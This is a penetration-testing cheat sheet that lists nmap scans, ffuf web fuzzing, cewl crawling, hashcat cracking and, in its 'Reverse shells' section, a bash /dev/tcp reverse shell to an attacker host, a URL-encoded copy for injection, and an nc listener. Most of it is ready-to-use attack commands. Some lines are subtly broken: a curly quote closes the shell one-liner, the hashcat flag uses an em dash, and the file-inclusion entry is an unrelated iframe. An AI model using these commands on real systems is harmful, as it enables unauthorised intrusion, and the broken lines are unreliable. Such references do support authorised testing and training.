# PenTestReference

A selection of commands and tools for PenTesters.

## Network scanning - nmap

### Quick scan of common ports

nmap -v -sV 10.10.10.99

### TCP scan

nmap -v -sT 10.10.10.99

### UDP scan (runs as root)

sudo nmap -v -sU 10.10.10.99

### TCP scan of all ports (takes a long time)

nmap -v -sT -p0-65535 10.10.10.99

### UDP scan of all ports (runs as root, takes a very long time)

nmap -v -sU -p0-65535 10.10.10.99

## Web fuzzing

### Fuzz for directories

ffuf -c -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.99/FUZZ

### Fuzz for php files

ffuf -c -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.187/FUZZ.php

### Fuzz for subdomains

ffuf -w /usr/share/dirb/wordlists/big.txt -u http://target.com -H "Host: FUZZ.target.com" -fs 4242

* Replace 4242 with the size of the main domain page, to ignore false positives

## Crawl website for strings

cewl http://10.10.10.99

## Reverse shells

### Start listener on linux

nc -lvnp 9999

### Basic bash shell

bash -c 'bash -i >& /dev/tcp/10.10.10.123/9999 0>&1’

### URL encoded bash shell

bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.99%2F9999%200%3E%261%27

### Getting a real shell

echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py

## Password hashes

### Hashcat

hashcat -m 100 hash.file /host/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule —force

## Local file inclusion

### iFrame

<iframe id="serviceFrameSend" src="test.html" width="1000" height="1000"  frameborder="0">
